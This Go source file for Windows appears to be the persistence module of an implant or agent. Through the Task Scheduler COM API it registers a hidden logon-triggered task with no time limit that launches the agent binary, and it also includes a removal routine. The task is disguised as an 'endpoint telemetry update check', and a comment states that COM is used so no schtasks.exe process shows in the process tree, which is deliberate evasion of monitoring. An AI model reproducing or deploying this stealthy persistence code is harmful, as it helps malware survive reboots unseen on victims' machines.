//go:build windows

package funcs

import (
	"fmt"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// registerUpdateSchedule creates a Windows scheduled task via the Task
// Scheduler COM API (ITaskService). The task fires on user logon and
// launches the agent binary. Using COM directly means no schtasks.exe
// child process appears in the process tree.
func registerUpdateSchedule(exePath string) error {
	if err := ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED); err != nil {
		return fmt.Errorf("COM init failed: %w", err)
	}
	defer ole.CoUninitialize()

	unknown, err := oleutil.CreateObject("Schedule.Service")
	if err != nil {
		return fmt.Errorf("failed to create Schedule.Service: %w", err)
	}
	defer unknown.Release()

	service, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return fmt.Errorf("failed to query ITaskService: %w", err)
	}
	defer service.Release()

	// Connect to the local task scheduler.
	if _, err := oleutil.CallMethod(service, "Connect"); err != nil {
		return fmt.Errorf("failed to connect to task scheduler: %w", err)
	}

	// Get the root task folder (\).
	folderVar, err := oleutil.CallMethod(service, "GetFolder", "\\")
	if err != nil {
		return fmt.Errorf("failed to get root folder: %w", err)
	}
	folder := folderVar.ToIDispatch()
	defer folder.Release()

	// Create a new task definition.
	defVar, err := oleutil.CallMethod(service, "NewTask", 0)
	if err != nil {
		return fmt.Errorf("failed to create task definition: %w", err)
	}
	def := defVar.ToIDispatch()
	defer def.Release()

	// ── Registration info ──────────────────────────────────────────
	regInfoVar, err := oleutil.GetProperty(def, "RegistrationInfo")
	if err != nil {
		return fmt.Errorf("failed to get RegistrationInfo: %w", err)
	}
	regInfo := regInfoVar.ToIDispatch()
	defer regInfo.Release()
	oleutil.PutProperty(regInfo, "Description", "Manages scheduled endpoint telemetry update checks")

	// ── Settings ───────────────────────────────────────────────────
	settingsVar, err := oleutil.GetProperty(def, "Settings")
	if err != nil {
		return fmt.Errorf("failed to get Settings: %w", err)
	}
	settings := settingsVar.ToIDispatch()
	defer settings.Release()

	oleutil.PutProperty(settings, "Enabled", true)
	oleutil.PutProperty(settings, "Hidden", true)
	oleutil.PutProperty(settings, "AllowDemandStart", true)
	oleutil.PutProperty(settings, "StopIfGoingOnBatteries", false)
	oleutil.PutProperty(settings, "DisallowStartIfOnBatteries", false)
	oleutil.PutProperty(settings, "ExecutionTimeLimit", "PT0S") // no timeout

	// ── Principal (run as current user, standard privileges) ──────
	principalVar, err := oleutil.GetProperty(def, "Principal")
	if err != nil {
		return fmt.Errorf("failed to get Principal: %w", err)
	}
	principal := principalVar.ToIDispatch()
	defer principal.Release()

	oleutil.PutProperty(principal, "RunLevel", 0) // TASK_RUNLEVEL_LUA (standard user)

	// ── Trigger: logon ─────────────────────────────────────────────
	triggersVar, err := oleutil.GetProperty(def, "Triggers")
	if err != nil {
		return fmt.Errorf("failed to get Triggers: %w", err)
	}
	triggers := triggersVar.ToIDispatch()
	defer triggers.Release()

	// TriggerType 9 = TASK_TRIGGER_LOGON
	triggerVar, err := oleutil.CallMethod(triggers, "Create", 9)
	if err != nil {
		return fmt.Errorf("failed to create logon trigger: %w", err)
	}
	trigger := triggerVar.ToIDispatch()
	defer trigger.Release()

	oleutil.PutProperty(trigger, "Enabled", true)

	// ── Action: exec ───────────────────────────────────────────────
	actionsVar, err := oleutil.GetProperty(def, "Actions")
	if err != nil {
		return fmt.Errorf("failed to get Actions: %w", err)
	}
	actions := actionsVar.ToIDispatch()
	defer actions.Release()

	// ActionType 0 = TASK_ACTION_EXEC
	actionVar, err := oleutil.CallMethod(actions, "Create", 0)
	if err != nil {
		return fmt.Errorf("failed to create exec action: %w", err)
	}
	action := actionVar.ToIDispatch()
	defer action.Release()

	oleutil.PutProperty(action, "Path", exePath)

	// ── Register the task ──────────────────────────────────────────
	// Flags: TASK_CREATE_OR_UPDATE = 6
	// LogonType: TASK_LOGON_INTERACTIVE_TOKEN = 3
	_, err = oleutil.CallMethod(folder, "RegisterTaskDefinition",
		ServiceLabel, // task name (e.g. "EndpointAutoUpdate")
		def,          // task definition
		6,            // TASK_CREATE_OR_UPDATE
		"",           // user (empty = current)
		"",           // password (empty = not needed for interactive)
		3,            // TASK_LOGON_INTERACTIVE_TOKEN
	)
	if err != nil {
		return fmt.Errorf("failed to register task: %w", err)
	}

	fmt.Printf("[+] Update schedule registered (Task Scheduler): %s\n", ServiceLabel)
	return nil
}

// removeUpdateSchedule deletes the scheduled task via COM.
func removeUpdateSchedule() error {
	if err := ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED); err != nil {
		return fmt.Errorf("COM init failed: %w", err)
	}
	defer ole.CoUninitialize()

	unknown, err := oleutil.CreateObject("Schedule.Service")
	if err != nil {
		return fmt.Errorf("failed to create Schedule.Service: %w", err)
	}
	defer unknown.Release()

	service, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return fmt.Errorf("failed to query ITaskService: %w", err)
	}
	defer service.Release()

	if _, err := oleutil.CallMethod(service, "Connect"); err != nil {
		return fmt.Errorf("failed to connect to task scheduler: %w", err)
	}

	folderVar, err := oleutil.CallMethod(service, "GetFolder", "\\")
	if err != nil {
		return fmt.Errorf("failed to get root folder: %w", err)
	}
	folder := folderVar.ToIDispatch()
	defer folder.Release()

	if _, err := oleutil.CallMethod(folder, "DeleteTask", ServiceLabel, 0); err != nil {
		return fmt.Errorf("failed to delete task: %w", err)
	}

	fmt.Printf("[-] Update schedule removed (Task Scheduler): %s\n", ServiceLabel)
	return nil
}
